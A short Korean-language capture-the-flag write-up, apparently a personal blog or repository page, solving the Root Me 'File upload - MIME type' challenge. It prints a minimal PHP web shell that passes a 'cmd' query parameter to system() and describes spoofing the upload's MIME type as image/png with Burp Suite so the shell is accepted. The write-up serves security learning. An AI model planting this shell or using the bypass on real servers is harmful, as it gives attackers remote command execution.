<!DOCTYPE html>
<html>
<head>
        <link rel="stylesheet" type="text/css" href="sytle.css">
</head>
<body>
        <h1>Root ME Web Hacking File upload - MIME type Write-Up</h1>
</body>
<br>
<br>
</html>

문제 사이트로 접속해보자

![image](https://github.com/user-attachments/assets/f9a75397-f5b1-4580-827e-3c01df0314c0)


upload로 들어가니 사진을 업로드 할 수 페이지가 나온다

![image](https://github.com/user-attachments/assets/be4a6b3e-dd5f-4d06-a73f-2b3721f4d1e1)

![image](https://github.com/user-attachments/assets/9c285c9b-c103-40c1-85ef-5d4b48245955)

파일 업로드 취약점을 이용해 php 파일을 업로드 해보면 될 것 같다.

일단 간단하게 웹쉘을 만들어 보았다.

```python
<?php
  $a = $_GET['cmd'];
  system($a);
?>
```

그리고 burp suite를 사용 해서 MIME type을 image/png로 바꿔 주었다.

+MIME type이란?

클라이언트에게 전송된 문서의 다양성을 알려주기 위한 메커니즘

웹에서 파일의 확장자는 별 의미가 없다. 그러므로, 각 문서와 함께 올바른 MIME type을 전송하도록, 서버가 정확시 설정하는것이 중요하다.

브라우저들은 리소스를 내려받았을 때 해야 할 기본 동작이 무엇인지를 결정하기 위해 MIME type을 사용한다.

![image](https://github.com/user-attachments/assets/96f3ddab-6af5-4a7f-b56a-c301bcf812af)

![image](https://github.com/user-attachments/assets/ef21fcce-e762-4526-aa90-7a1c39c9db3f)


MIME type을 바꾸고 Forward하면 webshell.php 파일이 업로드 된것을 확인할 수 있다.

![image](https://github.com/user-attachments/assets/3a2d1ece-7bc6-422a-af8c-b22a5210e8cb)


![image](https://github.com/user-attachments/assets/8173881f-4084-46c4-8d24-4938b2a76887)













